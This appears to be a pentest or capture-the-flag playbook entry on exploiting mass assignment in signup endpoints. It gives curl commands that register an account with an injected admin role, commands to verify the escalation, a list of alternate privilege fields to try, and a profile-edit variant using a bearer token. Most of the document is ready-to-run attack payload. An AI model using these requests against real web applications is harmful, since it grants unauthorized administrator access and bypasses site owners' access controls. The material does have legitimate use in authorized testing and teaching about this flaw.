# Signup role mass assignment

## Context

JSON registration endpoint binds extra body fields into the user model, allowing admin self-registration.

## Requirements

- `POST /signup` or equivalent register endpoint
- `Content-Type: application/json`
- App exposes a role-aware protected route (`/admin`, `/api/admin/*`)
- Confirmation endpoint such as `/api/users/me`

## Primary payload

```bash
BASE="https://<host>"

curl -s -c cookies.txt -X POST "$BASE/signup" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@example.com","password":"password123","role":"admin"}'
```

## Verification sequence

```bash
curl -s -b cookies.txt "$BASE/api/users/me"
curl -s -b cookies.txt "$BASE/admin"
```

## Expected signal

- `/api/users/me` includes `"role":"admin"`
- `/admin` returns `200` instead of redirect/forbidden

## Alternate field names to try

If `role` fails, test one field per request:

```json
{"email":"x","password":"y","user_role":"admin"}
{"email":"x","password":"y","isAdmin":true}
{"email":"x","password":"y","admin":true}
{"email":"x","password":"y","is_admin":true}
{"email":"x","password":"y","type":"admin"}
```

On Otex, only `role` worked.

## Update-path variant

If signup is hardened, retry on profile edit after normal registration:

```bash
curl -s -X PUT "$BASE/api/user/edit" \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"user_role":"admin"}'
```

## Why failed payloads failed

- Wrong property name for the ORM/model (`isAdmin` vs `role`)
- Endpoint allowlisted but a different update route remained vulnerable
- Role only checked in JWT while server-side DB role was unchanged

## Impact

Immediate privilege escalation to admin-only pages or flag endpoints.
